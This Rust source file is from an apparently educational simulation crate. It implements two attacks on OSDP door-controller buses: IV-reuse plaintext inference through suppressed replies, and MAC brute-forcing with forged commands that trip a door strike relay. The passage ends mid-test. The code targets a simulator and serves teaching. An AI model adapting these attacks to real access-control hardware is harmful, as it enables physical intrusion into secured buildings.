//! **The weaknesses nobody mentions: IV reuse and a 32-bit MAC.**
//!
//! Two inline actors, and the two most honest attacks in the crate, because
//! both of them are about *arithmetic* rather than about a missing feature.
//! Secure Channel is correctly implemented in the deployments these target. It
//! simply does not add up to as much as the marketing does.
//!
//! | Actor | Curriculum |
//! |---|---|
//! | [`MacForger`] | 4.2 |
//! | [`IvReuseExploiter`] | 4.3 |

use alloc::boxed::Box;
use alloc::rc::Rc;
use alloc::string::String;
use alloc::vec::Vec;
use core::cell::RefCell;

use odr_bus::{
    BusDir, Injection, InlineTap, LinkId, Micros, Observation, Origin, TapCtx, TapId, TapKind,
    TapPosition, TapVerdict, World,
};
use odr_osdp::codes::{Command, Reply};
use odr_osdp::payload::OutputCommand;
use odr_osdp::rng::SeededRng;
use odr_osdp::security::{ScsType, SecurityBlock};
use odr_osdp::Frame;

use crate::error::{AttackError, Result};
use crate::knowledge::{
    KnowledgeCell, Known, MacFacts, ObservedFrame, Provenance, RecoveredPlaintext,
};
use crate::shadow::ShadowSession;
use crate::Attacker;

// ---------------------------------------------------------------------------
// IV reuse
// ---------------------------------------------------------------------------

/// One encrypted command, as an epoch saw it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EpochFrame {
    /// When it crossed.
    pub t_us: Micros,
    /// The PD address.
    pub address: u8,
    /// The command code, which is in the clear.
    pub id: u8,
    /// The sequence number.
    pub sequence: u8,
    /// The ciphertext, exactly as it was on the wire.
    pub ciphertext: Vec<u8>,
}

/// **A run of frames encrypted under one IV.**
///
/// An epoch starts when the MAC chain in the command direction stops moving and
/// ends when it moves again. Everything inside one is encrypted under the same
/// CBC IV, because that IV is the ones' complement of an R-MAC that has not
/// changed.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct IvEpoch {
    /// Which epoch this is, counting from zero.
    pub index: usize,
    /// When it started.
    pub started_us: Micros,
    /// The encrypted commands inside it.
    pub frames: Vec<EpochFrame>,
}

/// Two or more frames in one epoch carrying byte-identical ciphertext.
///
/// Same key, same IV, same ciphertext means **same plaintext**, and an
/// eavesdropper holding no key at all can say so.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct IvCollision {
    /// Which epoch.
    pub epoch: usize,
    /// The ciphertext they share.
    pub ciphertext: Vec<u8>,
    /// When each of them crossed.
    pub at: Vec<Micros>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct CodebookEntry {
    ciphertext: Vec<u8>,
    plaintext: Vec<u8>,
    learned_at_us: Micros,
}

#[derive(Debug, Default)]
struct IvState {
    suppress: bool,
    suppress_after: Option<u8>,
    suppressed: usize,
    epochs: Vec<IvEpoch>,
    frames: Vec<ObservedFrame>,
    codebook: Vec<CodebookEntry>,
}

impl IvState {
    fn epoch_mut(&mut self, t_us: Micros) -> &mut IvEpoch {
        if self.epochs.is_empty() {
            let index = 0;
            self.epochs.push(IvEpoch {
                index,
                started_us: t_us,
                frames: Vec::new(),
            });
        }
        let last = self.epochs.len() - 1;
        &mut self.epochs[last]
    }

    fn close_epoch(&mut self, t_us: Micros) {
        if self
            .epochs
            .last()
            .map(|e| e.frames.is_empty())
            .unwrap_or(true)
        {
            return;
        }
        let index = self.epochs.len();
        self.epochs.push(IvEpoch {
            index,
            started_us: t_us,
            frames: Vec::new(),
        });
    }
}

/// **Curriculum 4.3: the IV is the previous MAC, and the MAC only moves when
/// the other end speaks.**
///
/// `odr-osdp` reproduces this faithfully rather than repairing it, because it
/// is what the reference implementations do. The IV for encrypting a command is
/// the ones' complement of the R-MAC — the last MAC computed in the *reply*
/// direction — so it does not change until a reply is processed. Two commands
/// with no reply between them are encrypted under the identical IV, and
/// identical plaintext therefore produces byte-identical ciphertext.
///
/// An inline attacker can arrange that for free: **suppress the replies**. The
/// controller times out, retransmits, and reseals the same command under the
/// same frozen IV, over and over, for anybody watching.
///
/// # What this does and does not give you
///
/// It is worth being precise, because the difference is the lesson.
///
/// What IV reuse gives an attacker with no key is **equality**: it can say that
/// two frames carry the same plaintext. That is already a real leak — repeated
/// commands, repeated card numbers, a door being told the same thing twice.
///
/// What it does not give is plaintext out of nothing. CBC with a reused IV is
/// not broken open by staring at it; you need one plaintext to anchor the
/// group. So this actor keeps a **codebook**: correspondences between
/// ciphertext and plaintext that it established some other way, and it extends
/// each one across every frame in the epoch that shares the ciphertext.
///
/// That extension is not decoration, and the reason is the attack's own doing.
/// An attacker decrypting a session runs a chained object: every frame it reads
/// advances its MAC state, and it has to be fed the traffic in the order the
/// endpoints processed it. An implant that suppresses replies breaks that
/// condition for itself — it sees replies the controller never received, and
/// processing them moves its chain out of step with the controller's. Its
/// decryptor then cannot read the retransmissions at all.
///
/// IV reuse reads them anyway, with no chain and no key: the ciphertext is
/// byte-identical to one whose plaintext is already in the codebook, so the
/// plaintext is the same. The test
/// `drill_4_3_iv_reuse_reads_a_frame_the_decryptor_cannot` asserts exactly
/// that — the session refuses the frame and the exploiter reports its
/// plaintext.
pub struct IvReuseExploiter {
    name: String,
    knowledge: KnowledgeCell,
    tap: Option<TapId>,
    state: Rc<RefCell<IvState>>,
}

impl core::fmt::Debug for IvReuseExploiter {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("IvReuseExploiter")
            .field("name", &self.name)
            .field("tap", &self.tap)
            .field("epochs", &self.epochs().len())
            .finish()
    }
}

impl IvReuseExploiter {
    /// An exploiter with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> IvReuseExploiter {
        IvReuseExploiter::sharing(name, KnowledgeCell::new())
    }

    /// An exploiter pooling what it learns with other actors — a
    /// [`crate::WeakKeyCracker`] that can anchor the codebook, for instance.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> IvReuseExploiter {
        IvReuseExploiter {
            name: name.into(),
            knowledge,
            tap: None,
            state: Rc::new(RefCell::new(IvState::default())),
        }
    }

    /// Cut the bus at the controller end.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        self.attach_at(world, link, TapPosition::default())
    }

    /// Cut the bus at a chosen position.
    pub fn attach_at(
        &mut self,
        world: &mut World,
        link: LinkId,
        position: TapPosition,
    ) -> Result<TapId> {
        let state = self.state.clone();
        let knowledge = self.knowledge.clone();
        let tap = InlineTap::new(
            self.name.clone(),
            move |ctx: &mut TapCtx<'_>, obs: &Observation<'_>| {
                let Some(frame) = obs.frame() else {
                    return TapVerdict::Pass;
                };
                let Some(dir) = obs.dir() else {
                    return TapVerdict::Pass;
                };
                let now = ctx.now();
                let mut st = match state.try_borrow_mut() {
                    Ok(s) => s,
                    Err(_) => return TapVerdict::Pass,
                };
                st.frames.push(ObservedFrame {
                    t_us: now,
                    dir,
                    frame: frame.clone(),
                });
                knowledge.update(|k| {
                    k.frames.push(Known::observed(
                        ObservedFrame {
                            t_us: now,
                            dir,
                            frame: frame.clone(),
                        },
                        now,
                        None,
                    ))
                });

                let secured = frame.scs_type().is_some_and(|s| s.has_mac());
                match dir {
                    BusDir::AcuToPd => {
                        // The trigger is a plaintext command byte, which is
                        // exactly what curriculum 4.1 is about: an attacker can
                        // tell what is happening without a key.
                        if st.suppress_after == Some(frame.id) {
                            st.suppress = true;
                        }
                        if frame.is_encrypted() {
                            let f = EpochFrame {
                                t_us: now,
                                address: frame.address,
                                id: frame.id,
                                sequence: frame.sequence,
                                ciphertext: frame.payload.clone(),
                            };
                            st.epoch_mut(now).frames.push(f);
                        }
                        TapVerdict::Pass
                    }
                    BusDir::PdToAcu => {
                        if st.suppress && secured {
                            // The controller's R-MAC cannot advance if it never
                            // gets an answer, and its IV cannot advance either.
                            st.suppressed += 1;
                            TapVerdict::Drop
                        } else {
                            if secured {
                                st.close_epoch(now);
                            }
                            TapVerdict::Pass
                        }
                    }
                }
            },
        );
        let id = world.add_tap_at(link, Box::new(tap), position)?;
        self.tap = Some(id);
        Ok(id)
    }

    /// Start or stop suppressing replies.
    pub fn suppress_replies(&self, on: bool) {
        let _ = self.state.try_borrow_mut().map(|mut s| s.suppress = on);
    }

    /// Start suppressing replies as soon as a given command is seen.
    ///
    /// The command byte is in the clear at every security level, so this is a
    /// trigger an attacker with no key can actually arm.
    pub fn suppress_after_command(&self, command: Command) {
        let _ = self
            .state
            .try_borrow_mut()
            .map(|mut s| s.suppress_after = Some(command.to_u8()));
    }

    /// How many replies have been swallowed.
    pub fn suppressed(&self) -> usize {
        self.state.try_borrow().map(|s| s.suppressed).unwrap_or(0)
    }

    /// Every IV epoch observed.
    pub fn epochs(&self) -> Vec<IvEpoch> {
        self.state
            .try_borrow()
            .map(|s| s.epochs.clone())
            .unwrap_or_default()
    }

    /// Everything the implant has seen cross it, in order.
    pub fn frames(&self) -> Vec<ObservedFrame> {
        self.state
            .try_borrow()
            .map(|s| s.frames.clone())
            .unwrap_or_default()
    }

    /// **Frames in one epoch sharing a ciphertext.**
    ///
    /// The whole finding, with no key involved: same key, same IV, same
    /// ciphertext, therefore same plaintext.
    pub fn collisions(&self) -> Vec<IvCollision> {
        let epochs = self.epochs();
        let mut out = Vec::new();
        for epoch in epochs {
            let mut groups: Vec<(Vec<u8>, Vec<Micros>)> = Vec::new();
            for f in &epoch.frames {
                match groups.iter_mut().find(|(c, _)| *c == f.ciphertext) {
                    Some((_, at)) => at.push(f.t_us),
                    None => groups.push((f.ciphertext.clone(), alloc::vec![f.t_us])),
                }
            }
            for (ciphertext, at) in groups {
                if at.len() > 1 {
                    out.push(IvCollision {
                        epoch: epoch.index,
                        ciphertext,
                        at,
                    });
                }
            }
        }
        out
    }

    /// Record a ciphertext/plaintext correspondence the attacker established
    /// some other way.
    pub fn learn(&self, ciphertext: Vec<u8>, plaintext: Vec<u8>, learned_at_us: Micros) {
        let _ = self.state.try_borrow_mut().map(|mut s| {
            if !s.codebook.iter().any(|e| e.ciphertext == ciphertext) {
                s.codebook.push(CodebookEntry {
                    ciphertext,
                    plaintext,
                    learned_at_us,
                });
            }
        });
    }

    /// Anchor the codebook by running a reconstructed session over the capture.
    ///
    /// Whatever the session manages to read becomes a codebook entry. Whatever
    /// it cannot read — and it will fail on every repeat, because opening a
    /// frame advances its chain — is left for [`IvReuseExploiter::recover`].
    ///
    /// Returns how many correspondences were learned.
    pub fn learn_from_shadow(
        &self,
        session: &mut ShadowSession,
        frames: &[ObservedFrame],
    ) -> usize {
        let mut learned = 0;
        for f in frames {
            if f.frame.address != session.address() || f.t_us <= session.handshake_end_us() {
                continue;
            }
            if !f.frame.scs_type().is_some_and(|s| s.has_mac()) {
                continue;
            }
            let ciphertext = f.frame.payload.clone();
            if let Ok(plaintext) = session.open(f.dir, &f.frame) {
                if f.frame.is_encrypted() {
                    self.learn(ciphertext, plaintext, f.t_us);
                    learned += 1;
                }
            }
        }
        learned
    }

    /// **Read the plaintext of every frame the codebook reaches through IV
    /// reuse.**
    ///
    /// For each frame in an epoch whose ciphertext matches a codebook entry
    /// learned from a *different* frame, the plaintext is the same — because
    /// the IV was the same and the key was the same. The attacker reports it
    /// without decrypting anything.
    pub fn recover(&self) -> Vec<RecoveredPlaintext> {
        let (epochs, codebook) = match self.state.try_borrow() {
            Ok(s) => (s.epochs.clone(), s.codebook.clone()),
            Err(_) => return Vec::new(),
        };
        let mut out = Vec::new();
        for epoch in epochs {
            for f in epoch.frames {
                let Some(entry) = codebook.iter().find(|e| e.ciphertext == f.ciphertext) else {
                    continue;
                };
                if entry.learned_at_us == f.t_us {
                    continue; // this is the frame the codebook came from
                }
                out.push(RecoveredPlaintext {
                    t_us: f.t_us,
                    address: f.address,
                    id: f.id,
                    bytes: entry.plaintext.clone(),
                    method: "IV reuse: byte-identical ciphertext at a frozen chain position",
                });
            }
        }
        let filed = out.clone();
        self.knowledge.update(|k| {
            for p in filed {
                k.plaintexts.push(Known::derived(
                    p,
                    "a known plaintext extended across an IV epoch",
                ));
            }
        });
        out
    }
}

impl Attacker for IvReuseExploiter {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Inline
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.tap
    }
}

// ---------------------------------------------------------------------------
// MAC forgery
// ---------------------------------------------------------------------------

/// How one slice of a forgery attempt went.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ForgeProgress {
    /// How many frames have been sent in total.
    pub attempts: u64,
    /// True once the PD accepted one.
    pub accepted: bool,
    /// How many MAC bytes are actually carrying strength on this bus.
    pub mac_bytes: u8,
    /// The size of the space those bytes describe.
    pub search_space: u128,
    /// How long one attempt costs on this bus, measured.
    pub us_per_attempt: Micros,
    /// How much virtual time has gone by since the first attempt.
    pub elapsed_us: Micros,
}

/// **A search over a MAC space, driven one slice at a time.**
///
/// `docs/UI.md` settles what drill 4.2 does with this: the shortened forgery
/// completes and the drill proceeds, and **alongside it the genuine 32-bit
/// computation starts and keeps running**, with a progress bar that crawls and
/// a projected completion date rendered in full. It is still running when the
/// learner closes the tab. Nobody who sees that forgets what 32 bits of MAC is
/// worth, and no amount of explanatory text achieves the same thing.
///
/// So this is a counter and a rate rather than a loop: [`MacSearch::step`]
/// advances it by however many candidates the caller can afford this frame, and
/// [`MacSearch::projected_total_us`] is what the site renders a date from.
///
/// The rate is not a guess. It is measured from the attempts the attacker
/// actually made on the bus in front of it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct MacSearch {
    space: u128,
    tried: u128,
    us_per_attempt: Micros,
}

impl MacSearch {
    /// A search over a MAC of `bits` bits, at a measured cost per attempt.
    pub fn over_bits(bits: u32, us_per_attempt: Micros) -> MacSearch {
        MacSearch {
            space: 1u128 << bits.min(126),
            tried: 0,
            us_per_attempt: us_per_attempt.max(1),
        }
    }

    /// The genuine OSDP MAC: thirty-two bits, no negotiation, no option.
    pub fn genuine(us_per_attempt: Micros) -> MacSearch {
        MacSearch::over_bits(32, us_per_attempt)
    }

    /// Advance the counter.
    pub fn step(&mut self, candidates: u64) -> &mut MacSearch {
        self.tried = self
            .tried
            .saturating_add(u128::from(candidates))
            .min(self.space);
        self
    }

    /// How many candidates the space holds.
    pub fn space(&self) -> u128 {
        self.space
    }

    /// How many have been tried.
    pub fn tried(&self) -> u128 {
        self.tried
    }

    /// How many are left.
    pub fn remaining(&self) -> u128 {
        self.space.saturating_sub(self.tried)
    }

    /// Progress, between 0 and 1.
    pub fn fraction(&self) -> f64 {
        if self.space == 0 {
            return 1.0;
        }
        self.tried as f64 / self.space as f64
    }

    /// True once the whole space has been swept.
    pub fn is_finished(&self) -> bool {
        self.tried >= self.space
    }

    /// What one attempt costs on this bus.
    pub fn us_per_attempt(&self) -> Micros {
        self.us_per_attempt
    }

    /// Virtual microseconds spent so far.
    pub fn elapsed_us(&self) -> u128 {
        self.tried.saturating_mul(u128::from(self.us_per_attempt))
    }

    /// Virtual microseconds still to go.
    pub fn remaining_us(&self) -> u128 {
        self.remaining()
            .saturating_mul(u128::from(self.us_per_attempt))
    }

    /// Virtual microseconds for the whole sweep.
    pub fn projected_total_us(&self) -> u128 {
        self.space.saturating_mul(u128::from(self.us_per_attempt))
    }

    /// The whole sweep, in years. This is the number the site renders a date
    /// from.
    pub fn projected_years(&self) -> f64 {
        self.projected_total_us() as f64 / 1_000_000.0 / 60.0 / 60.0 / 24.0 / 365.25
    }

    /// A sentence for the progress bar's label.
    pub fn describe(&self) -> String {
        let years = self.projected_years();
        if years >= 1.0 {
            alloc::format!(
                "{} of {} candidates at {} us each: {:.1} years",
                self.tried,
                self.space,
                self.us_per_attempt,
                years
            )
        } else {
            alloc::format!(
                "{} of {} candidates at {} us each: {:.1} days",
                self.tried,
                self.space,
                self.us_per_attempt,
                years * 365.25
            )
        }
    }
}

#[derive(Debug, Default)]
struct ForgerState {
    isolate: bool,
    /// MACs seen on genuine frames, for measuring how wide they really are.
    macs: Vec<[u8; 4]>,
    /// The last command sequence the real controller used, which is what the
    /// PD's expected sequence follows from.
    last_command_seq: Option<u8>,
    /// Replies the PD sent while the attacker was hammering it.
    replies: Vec<(Micros, Frame)>,
    accepted: Option<Frame>,
}

/// **Curriculum 4.2: thirty-two bits of MAC, and no attempt limiter anywhere.**
///
/// OSDP puts four bytes of a sixteen-byte CBC-MAC on the wire. Twelve bytes of
/// authentication strength are discarded to save four bytes per frame on a bus
/// that is usually running at 9600 baud with nothing else to say. A blind
/// forgery therefore succeeds about one time in four billion — and the protocol
/// has no attempt limiter, no lockout and no log, so an online forgery attack is
/// merely *slow* rather than impossible.
///
/// # How it works here
///
/// The forger is **inline**, and it isolates the peripheral first: it drops the
/// real controller's commands so that the PD's session stays alive and its
/// sequence numbering follows the attacker's frames rather than the
/// controller's. Then it hammers.
///
/// Three things it calibrates from its tap position rather than being told:
///
/// * **The sequence number.** A rejected frame still advances the PD's expected
///   sequence, and the NAK says which sequence it answered, so the attacker
///   tracks it exactly.
/// * **The MAC width.** Genuine frames are on the wire; counting the
///   significant bytes of their MACs says how wide the target is. On a real bus
///   that is four. On a bus a drill has rigged so the attack completes in front
///   of a learner, the surplus bytes are zero and this measures it.
/// * **The rate.** How long one attempt takes, which is what
///   [`MacForger::genuine_search`] projects the real 32-bit cost from.
///
/// # The honest part
///
/// A rejected frame does **not** advance the PD's MAC chain, so failures cost
/// nothing but time — and the attacker knows the target for each of the three
/// sequence numbers is fixed while it hammers, so it sweeps rather than
/// guessing at random. That is exactly why 32 bits with no rate limit is worth
/// so much less than it sounds, and exactly why it still is not free.
pub struct MacForger {
    name: String,
    knowledge: KnowledgeCell,
    tap: Option<TapId>,
    state: Rc<RefCell<ForgerState>>,
    address: u8,
    mac_bytes: u8,
    /// One counter per sequence number: the target MAC is fixed for a given
    /// sequence while the chain is frozen, so sweeping is sound.
    counters: [u32; 4],
    next_seq: u8,
    attempts: u64,
    slot_us: Micros,
    started_us: Option<Micros>,
    rng: SeededRng,
}

impl core::fmt::Debug for MacForger {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("MacForger")
            .field("name", &self.name)
            .field("tap", &self.tap)
            .field("address", &self.address)
            .field("attempts", &self.attempts)
            .finish()
    }
}

impl MacForger {
    /// A forger aimed at one address.
    pub fn new(name: impl Into<String>, address: u8, seed: u64) -> MacForger {
        MacForger::sharing(name, KnowledgeCell::new(), address, seed)
    }

    /// A forger pooling what it learns with other actors.
    pub fn sharing(
        name: impl Into<String>,
        knowledge: KnowledgeCell,
        address: u8,
        seed: u64,
    ) -> MacForger {
        MacForger {
            name: name.into(),
            knowledge,
            tap: None,
            state: Rc::new(RefCell::new(ForgerState::default())),
            address: address & 0x7F,
            mac_bytes: 4,
            counters: [0; 4],
            next_seq: 1,
            attempts: 0,
            slot_us: 40_000,
            started_us: None,
            rng: SeededRng::new(seed),
        }
    }

    /// How long to allow each attempt. A frame plus a reply plus turnaround at
    /// 9600 baud is a few tens of milliseconds.
    pub fn with_slot(mut self, us: Micros) -> MacForger {
        self.slot_us = us.max(1_000);
        self
    }

    /// Cut the bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        let state = self.state.clone();
        let tap = InlineTap::new(
            self.name.clone(),
            move |ctx: &mut TapCtx<'_>, obs: &Observation<'_>| {
                let Some(frame) = obs.frame() else {
                    return TapVerdict::Pass;
                };
                let Some(dir) = obs.dir() else {
                    return TapVerdict::Pass;
                };
                let now = ctx.now();
                let mut st = match state.try_borrow_mut() {
                    Ok(s) => s,
                    Err(_) => return TapVerdict::Pass,
                };
                // Genuine MACs, for measuring the width of the target.
                if let Some(mac) = frame.mac {
                    st.macs.push(mac);
                }
                match dir {
                    BusDir::AcuToPd => {
                        st.last_command_seq = Some(frame.sequence & 0x03);
                        if st.isolate {
                            // Keep the real controller away while the PD is
                            // being hammered, so its session and its sequence
                            // numbering belong to the attacker.
                            TapVerdict::Drop
                        } else {
                            TapVerdict::Pass
                        }
                    }
                    BusDir::PdToAcu => {
                        if st.isolate {
                            st.replies.push((now, frame.clone()));
                            TapVerdict::Drop
                        } else {
                            TapVerdict::Pass
                        }
                    }
                }
            },
        );
        let id = world.add_tap(link, Box::new(tap))?;
        self.tap = Some(id);
        Ok(id)
    }

    /// **Measure how wide the MACs on this bus really are.**
    ///
    /// Counts the significant bytes of every genuine MAC that has crossed the
    /// implant. Four is the protocol's answer and what a real bus gives. A bus
    /// a drill has shortened leaves the surplus bytes zero, and this is how the
    /// attacker finds that out — from the wire, rather than by being told.
    pub fn calibrate(&mut self) -> Result<MacFacts> {
        let macs = self
            .state
            .try_borrow()
            .map(|s| s.macs.clone())
            .unwrap_or_default();
        if macs.is_empty() {
            return Err(AttackError::nothing(
                "MAC calibration",
                "no authenticated frame has crossed the implant yet",
            ));
        }
        let mut width = 1usize;
        for m in &macs {
            for (i, b) in m.iter().enumerate() {
                if *b != 0 {
                    width = width.max(i + 1);
                }
            }
        }
        let facts = MacFacts {
            effective_bytes: width as u8,
            samples: macs.len(),
        };
        self.mac_bytes = facts.effective_bytes;
        self.knowledge.update(|k| {
            k.mac_facts.push(Known::new(
                facts,
                Provenance::Calibrated {
                    what: "how many MAC bytes on this bus are non-zero",
                },
            ))
        });
        Ok(facts)
    }

    /// Cut the real controller off while the attack runs.
    pub fn isolate(&self, on: bool) {
        let _ = self.state.try_borrow_mut().map(|mut s| {
            s.isolate = on;
            if on {
                // The PD's expected sequence follows on from the last command
                // it processed, which the implant watched go past.
                s.replies.clear();
            }
        });
    }

    /// Send one batch of forged frames and let the world run through them.
    ///
    /// Each attempt is a well-formed SCS_15 command — authenticated, not
    /// encrypted — with a MAC the attacker guessed. The PD checks it, NAKs, and
    /// **does not advance its MAC chain**, so the next attempt costs nothing
    /// but another frame time.
    pub fn step(&mut self, world: &mut World, attempts: u32) -> Result<ForgeProgress> {
        let tap = self.tap.ok_or_else(|| AttackError::NotAttached {
            actor: self.name.clone(),
        })?;
        if self.started_us.is_none() {
            self.started_us = Some(world.now());
            // The PD expects the value after the last command it processed.
            let last = self
                .state
                .try_borrow()
                .ok()
                .and_then(|s| s.last_command_seq)
                .unwrap_or(0);
            self.next_seq = next_sequence(last);
        }

        for _ in 0..attempts {
            if self.accepted().is_some() {
                break;
            }
            let seq = self.next_seq;
            let guess = self.next_guess(seq);
            let frame = self.forged_frame(seq, guess);
            let at = world.now().saturating_add(1_000);
            world.inject(
                tap,
                Injection::bus_bytes(at, BusDir::AcuToPd, frame.encode()),
            )?;
            world.run_until(at.saturating_add(self.slot_us))?;
            self.attempts = self.attempts.saturating_add(1);
            self.next_seq = next_sequence(seq);
            self.check_replies(&frame);
        }

        let elapsed = world.now().saturating_sub(self.started_us.unwrap_or(0));
        Ok(ForgeProgress {
            attempts: self.attempts,
            accepted: self.accepted().is_some(),
            mac_bytes: self.mac_bytes,
            search_space: 1u128 << (u32::from(self.mac_bytes) * 8).min(126),
            us_per_attempt: self.us_per_attempt(world),
            elapsed_us: elapsed,
        })
    }

    /// Hammer until the PD accepts or the budget runs out.
    pub fn run(&mut self, world: &mut World, max_attempts: u32) -> Result<ForgeProgress> {
        let mut progress = self.step(world, 0)?;
        let mut done = 0u32;
        while done < max_attempts && !progress.accepted {
            let slice = 32.min(max_attempts - done);
            progress = self.step(world, slice)?;
            done += slice;
        }
        Ok(progress)
    }

    /// The frame the PD accepted, if it accepted one.
    pub fn accepted(&self) -> Option<Frame> {
        self.state
            .try_borrow()
            .ok()
            .and_then(|s| s.accepted.clone())
    }

    /// How many frames have been sent.
    pub fn attempts(&self) -> u64 {
        self.attempts
    }

    /// How long one attempt costs on this bus, measured rather than assumed.
    pub fn us_per_attempt(&self, world: &World) -> Micros {
        match (self.started_us, self.attempts) {
            (Some(start), n) if n > 0 => world.now().saturating_sub(start) / n,
            _ => self.slot_us,
        }
    }

    /// **The genuine 32-bit search, as a counter and a rate.**
    ///
    /// This is what `docs/UI.md` puts on the bar that never finishes. The rate
    /// comes from the attempts the attacker really made on the bus in front of
    /// it, so the projected date is this bus's number rather than a textbook's.
    pub fn genuine_search(&self, world: &World) -> MacSearch {
        MacSearch::genuine(self.us_per_attempt(world))
    }

    /// The search actually being run, over the rigged width if the bus is
    /// rigged and over the real one if it is not.
    pub fn search(&self, world: &World) -> MacSearch {
        MacSearch::over_bits(u32::from(self.mac_bytes) * 8, self.us_per_attempt(world))
    }

    /// Which address it is aimed at.
    pub fn address(&self) -> u8 {
        self.address
    }

    fn next_guess(&mut self, seq: u8) -> [u8; 4] {
        let idx = (seq & 0x03) as usize;
        let keep = self.mac_bytes.clamp(1, 4) as usize;
        let counter = self.counters[idx];
        self.counters[idx] = self.counters[idx].wrapping_add(1);
        let mut mac = [0u8; 4];
        for (i, slot) in mac.iter_mut().enumerate().take(keep) {
            *slot = ((counter >> (8 * i)) & 0xFF) as u8;
        }
        // Past the swept width there is nothing to sweep, because the wire says
        // those bytes are zero. Anything wider than the counter is filled from
        // the seeded generator so a drill on a full-width bus still behaves
        // like a blind search rather than a counter that never gets there.
        if keep > 4 {
            self.rng.fill(&mut mac);
        }
        mac
    }

    fn forged_frame(&self, sequence: u8, mac: [u8; 4]) -> Frame {
        // `CMD_OUT` drives the peripheral's output relay, which in a
        // reader-controlled door is the strike. Any command would prove the
        // point; this one says what the point is.
        let payload = OutputCommand {
            output: 0,
            control_code: 0x01,
            timer_100ms: 30,
        }
        .encode();
        Frame {
            mark: false,
            address: self.address,
            is_reply: false,
            sequence: sequence & 0x03,
            use_crc: true,
            security: Some(SecurityBlock::new(ScsType::CmdMacOnly)),
            id: Command::Out.to_u8(),
            payload,
            mac: Some(mac),
        }
    }

    /// Did the PD answer the last forgery with anything other than a refusal?
    fn check_replies(&mut self, sent: &Frame) {
        let accepted = {
            let Ok(st) = self.state.try_borrow() else {
                return;
            };
            st.replies.iter().any(|(_, r)| {
                r.address == self.address
                    && r.sequence == (sent.sequence & 0x03)
                    && r.reply_code() != Some(Reply::Nak)
            })
        };
        if accepted {
            let _ = self
                .state
                .try_borrow_mut()
                .map(|mut s| s.accepted = Some(sent.clone()));
            let f = sent.clone();
            self.knowledge.update(|k| {
                k.notes.push(alloc::format!(
                    "the PD accepted a {}-byte MAC that was never derived from the session key",
                    f.mac.map(|m| m.len()).unwrap_or(0)
                ))
            });
        }
    }
}

fn next_sequence(current: u8) -> u8 {
    match current & 0x03 {
        3 => 1,
        other => other + 1,
    }
}

impl Attacker for MacForger {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Inline
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.tap
    }
}

/// True if the PD's acceptance of `frame` is attributable to `tap` in the
/// world's own cause chain.
///
/// Curriculum 4.2's flag is "the learner produces a frame the PD accepts whose
/// MAC was not derived from the session key", and the *accepts* half is a
/// question for the engine rather than for the attacker.
pub fn acceptance_is_attributable(world: &World, tap: TapId) -> bool {
    world
        .log()
        .records()
        .iter()
        .filter(|r| {
            matches!(&r.kind, odr_bus::RecordKind::BusTx { frame: Some(f), .. }
                if f.is_reply && f.reply_code() != Some(Reply::Nak))
        })
        .any(|r| world.log().originator(r.seq) == Some(Origin::Tap(tap)))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_search_over_thirty_two_bits_never_finishes_in_a_lifetime() {
        let mut search = MacSearch::genuine(20_000);
        assert_eq!(search.space(), 1u128 << 32);
        assert_eq!(search.tried(), 0);
        assert_eq!(search.fraction(), 0.0);
        search.step(1_000_000);
        assert_eq!(search.tried(), 1_000_000);
        assert_eq!(search.elapsed_us(), 20_000_000_000);
        assert!(!search.is_finished());
        assert!(search.projected_years() > 2.0, "{}", search.describe());
        assert!(search.remaining() > 4_000_000_000);
    }

    #[test]
    fn a_search_saturates_at_its_own_space_rather_than_overflowing() {
        let mut search = MacSearch::over_bits(8, 1_000);
        assert_eq!(search.space(), 256);
        search.step(u64::MAX);
        assert_eq!(search.tried(), 256);
        assert!(search.is_finished());
        assert_eq!(search.remaining(), 0);
        assert_eq!(search.fraction(), 1.0);
        assert!(search.describe().contains("days"));
    }

    #[test]
    fn a_rate_of_zero_is_clamped_rather_than_dividing_by_nothing() {
        let search = MacSearch::over_bits(16, 0);
        assert_eq!(search.us_per_attempt(), 1);
        assert_eq!(search.projected_total_us(), 65_536);
    }

    #[test]
    fn sequence_numbers_cycle_one_two_three() {
        assert_eq!(next_sequence(0), 1);
        assert_eq!(next_sequence(1), 2);
        assert_eq!(next_sequence(2), 3);
        assert_eq!(next_sequence(3), 1);
    }

    #[test]
    fn a_forged_frame_is_a_well_formed_scs_15_command() {
        let forger = MacForger::new("forger", 0x07, 1);
        let frame = forger.forged_frame(2, [0xDE, 0, 0, 0]);
        assert_eq!(frame.address, 0x07);
        assert!(!frame.is_reply);
        assert_eq!(frame.sequence, 2);
        assert_eq!(frame.command_code(), Some(Command::Out));
        assert_eq!(frame.scs_type(), Some(ScsType::CmdMacOnly));
        assert_eq!(frame.mac, Some([0xDE, 0, 0, 0]));
        // It survives the wire, which it has to: the PD parses it like any
        // other frame before it ever reaches the MAC check.
        let (parsed, used) = Frame::parse(&frame.encode()).unwrap();
        assert_eq!(used, frame.encode().len());
        assert_eq!(parsed.mac, frame.mac);
    }

    #[test]
    fn guesses_sweep_a_byte_at_a_time_per_sequence_number() {
        let mut forger = MacForger::new("forger", 1, 0);
        forger.mac_bytes = 1;
        // The target MAC is fixed for a given sequence while the chain is
        // frozen, so sweeping is sound and covers the byte in 256 tries.
        let mut seen = alloc::vec::Vec::new();
        for _ in 0..256 {
            seen.push(forger.next_guess(1)[0]);
        }
        seen.sort_unstable();
        seen.dedup();
